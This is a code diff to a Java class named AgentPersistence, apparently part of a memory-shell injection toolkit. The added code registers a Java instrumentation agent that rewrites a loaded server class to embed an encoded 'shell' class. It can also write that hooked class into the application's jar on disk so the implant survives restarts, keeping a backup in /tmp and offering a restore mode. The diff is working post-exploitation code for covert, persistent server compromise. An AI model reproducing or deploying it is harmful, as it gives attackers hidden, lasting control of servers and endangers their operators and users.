@@ -10,6 +10,9 @@ import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
+import java.lang.instrument.ClassDefinition;
+import java.lang.instrument.ClassFileTransformer;
+import java.lang.instrument.Instrumentation;
 import java.net.JarURLConnection;
 import java.net.URL;
 import java.security.CodeSource;
@@ -22,7 +25,7 @@ import java.util.jar.JarFile;
 import java.util.jar.JarOutputStream;
 
 /**
- * Runtime persistence support embedded into Agent injectors that declare a persist method.
+ * Runtime persistence and restore support embedded into Agent injectors that declare a persist method.
  */
 public final class AgentPersistence {
     private AgentPersistence() {
@@ -33,45 +36,93 @@ public final class AgentPersistence {
     }
 
     public static boolean isPersistent(String args) {
+        return hasFlag(args, "persist=true");
+    }
+
+    public static boolean isRestore(String args) {
+        return hasFlag(args, "restore=true");
+    }
+
+    private static boolean hasFlag(String args, String flag) {
         if (args == null) {
             return false;
         }
         for (String arg : args.split(",")) {
-            if ("persist=true".equalsIgnoreCase(arg.trim())) {
+            if (flag.equalsIgnoreCase(arg.trim())) {
                 return true;
             }
         }
         return false;
     }
 
+    /**
+     * Registers the agent hook and, when requested, persists it into the target jar or restores it.
+     *
+     * @return the registered transformer, or {@code null} when restoring
+     */
+    public static ClassFileTransformer launch(String args, Instrumentation inst,
+                                              ClassFileTransformer previous,
+                                              AgentInjectorSupport.Config config,
+                                              String shellClassName, String shellBase64) throws Exception {
+        System.out.println("MemShell Agent is starting");
+        boolean restore = isRestore(args);
+        boolean persist = !restore && isPersistent(args);
+        boolean targetFound = false;
+        if (previous != null) {
+            inst.removeTransformer(previous);
+        }
+        ClassFileTransformer transformer = null;
+        if (!restore) {
+            transformer = AgentInjectorSupport.create(config, shellClassName, shellBase64);
+            inst.addTransformer(transformer, true);
+        }
+        for (Class<?> loadedClass : inst.getAllLoadedClasses()) {
+            if (!config.matches(loadedClass.getName())) {
+                continue;
+            }
+            targetFound = true;
+            if (restore) {
+                restore(inst, loadedClass);
+            } else {
+                inst.retransformClasses(loadedClass);
+                if (persist) {
+                    persist(loadedClass, config, shellClassName, shellBase64);
+                }
+            }
+        }
+        if (restore && !targetFound) {
+            throw new IllegalStateException("Cannot restore before " + config.describeTarget() + " is loaded");
+        }
+        if (persist && !targetFound) {
+            throw new IllegalStateException("Cannot persist before " + config.describeTarget() + " is loaded");
+        }
+        return transformer;
+    }
+
+    public static File persist(Class<?> targetClass, AgentInjectorSupport.Config config,
+                               String shellClassName, String shellBase64) throws Exception {
+        return persist(targetClass, config, shellClassName,
+                AgentInjectorSupport.gzipDecompress(AgentInjectorSupport.decodeBase64(shellBase64)));
+    }
+
+    public static File persist(Class<?> targetClass, final AgentInjectorSupport.Config config,
+                               final String shellClassName, byte[] shellClassBytes) throws Exception {
+        return persist(targetClass, shellClassName, shellClassBytes, new Transformer() {
+            @Override
+            public byte[] transform(ClassLoader loader, byte[] classBytes) {
+                return AgentInjectorSupport.transformClass(loader, classBytes, config, shellClassName);
+            }
+        });
+    }
+
     public static File persist(Class<?> targetClass, final String shellClassName,
                                byte[] shellClassBytes, Transformer transformer) throws Exception {
-        ProtectionDomain protectionDomain = targetClass.getProtectionDomain();
-        CodeSource codeSource = protectionDomain == null ? null : protectionDomain.getCodeSource();
-        URL location = codeSource == null ? null : codeSource.getLocation();
-        if (location != null && "jar".equalsIgnoreCase(location.getProtocol())) {
-            location = ((JarURLConnection) location.openConnection()).getJarFileURL();
-        }
-        if (location == null) {
-            throw new IllegalStateException("Cannot persist a class loaded from null");
-        }
-        File originalJar;
-        if ("file".equalsIgnoreCase(location.getProtocol())) {
-            originalJar = new File(location.toURI());
-        } else if ("vfs".equalsIgnoreCase(location.getProtocol())) {
-            originalJar = new File(location.toURI().getPath());
-        } else {
-            throw new IllegalStateException("Cannot persist a class loaded from " + location);
-        }
-        originalJar = resolveDeploymentJar(originalJar);
-        if (!originalJar.isFile()) {
-            throw new IllegalStateException("Agent target code source is not a jar: " + originalJar);
-        }
+        File originalJar = resolveTargetJar(targetClass);
 
         if (!new ClassReader(shellClassBytes).getClassName().equals(shellClassName.replace('.', '/'))) {
             throw new IllegalArgumentException("Shell class name does not match its bytecode: " + shellClassName);
         }
-        File backupJar = new File("/tmp", originalJar.getName() + ".bak");
+        File backupJar = backupJar(originalJar);
         if (backupJar.exists()) {
             throw new IllegalStateException("Backup already exists; restore it before persisting again: " + backupJar);
         }
@@ -88,8 +139,88 @@ public final class AgentPersistence {
         }
         System.out.println("MemShell Agent persisted " + originalJar);
         System.out.println("Original jar backup: " + backupJar);
-        System.out.println("Stop the server and restore with: cp -p " + backupJar + " " + originalJar);
+        System.out.println("Restore with the same agent jar and restore=true, or after shutdown: cp -p "
+                + backupJar + " " + originalJar);
         return backupJar;
+    }
+
+    /**
+     * Undoes {@link #persist}: restores the original jar from its backup and rewrites the loaded
+     * target class back to the pristine bytecode, so the running server drops the injected hook too.
+     */
+    public static File restore(Instrumentation instrumentation, Class<?> targetClass) throws Exception {
+        File originalJar = resolveTargetJar(targetClass);
+        File backupJar = backupJar(originalJar);
+        if (!backupJar.isFile()) {
+            throw new IllegalStateException("No persistence backup to restore: " + backupJar);
+        }
+        String targetEntryName = targetClass.getName().replace('.', '/') + ".class";
+        byte[] originalClassBytes;
+        JarFile backup = new JarFile(backupJar);
+        try {
+            JarEntry targetEntry = backup.getJarEntry(targetEntryName);
+            if (targetEntry == null) {
+                throw new IllegalStateException("Target class not found in " + backupJar + ": " + targetEntryName);
+            }
+            originalClassBytes = readEntry(backup, targetEntry);
+        } finally {
+            backup.close();
+        }
+
+        restoreJar(backupJar, originalJar);
+        try {
+            instrumentation.redefineClasses(new ClassDefinition(targetClass, originalClassBytes));
+        } catch (Exception e) {
+            throw new IllegalStateException("Jar restored, but the running class could not be restored; restart the server: "
+                    + targetClass.getName(), e);
+        }
+        if (!backupJar.delete()) {
+            System.out.println("Cannot delete restored jar backup: " + backupJar);
+        }
+        System.out.println("MemShell Agent restored " + originalJar);
+        return originalJar;
+    }
+
+    private static File backupJar(File originalJar) {
+        return new File("/tmp", originalJar.getName() + ".bak");
+    }
+
+    private static File resolveTargetJar(Class<?> targetClass) throws Exception {
+        ProtectionDomain protectionDomain = targetClass.getProtectionDomain();
+        CodeSource codeSource = protectionDomain == null ? null : protectionDomain.getCodeSource();
+        URL location = codeSource == null ? null : codeSource.getLocation();
+        if (location != null && "jar".equalsIgnoreCase(location.getProtocol())) {
+            location = ((JarURLConnection) location.openConnection()).getJarFileURL();
+        }
+        if (location == null) {
+            throw new IllegalStateException("Cannot modify a class loaded from null");
+        }
+        File originalJar;
+        if ("file".equalsIgnoreCase(location.getProtocol())) {
+            originalJar = new File(location.toURI());
+        } else if ("vfs".equalsIgnoreCase(location.getProtocol())) {
+            originalJar = new File(location.toURI().getPath());
+        } else {
+            throw new IllegalStateException("Cannot modify a class loaded from " + location);
+        }
+        originalJar = resolveDeploymentJar(originalJar);
+        if (!originalJar.isFile()) {
+            throw new IllegalStateException("Agent target code source is not a jar: " + originalJar);
+        }
+        return originalJar;
+    }
+
+    private static void restoreJar(File backupJar, File originalJar) throws IOException {
+        File tempJar = File.createTempFile(originalJar.getName(), ".tmp", originalJar.getParentFile());
+        try {
+            copyFile(backupJar, tempJar);
+            replaceJar(tempJar, originalJar, backupJar);
+        } finally {
+            if (tempJar.exists()) {
+                tempJar.delete();
+            }
+        }
+        originalJar.setLastModified(backupJar.lastModified());
     }
 
     private static File resolveDeploymentJar(File originalJar) throws IOException {
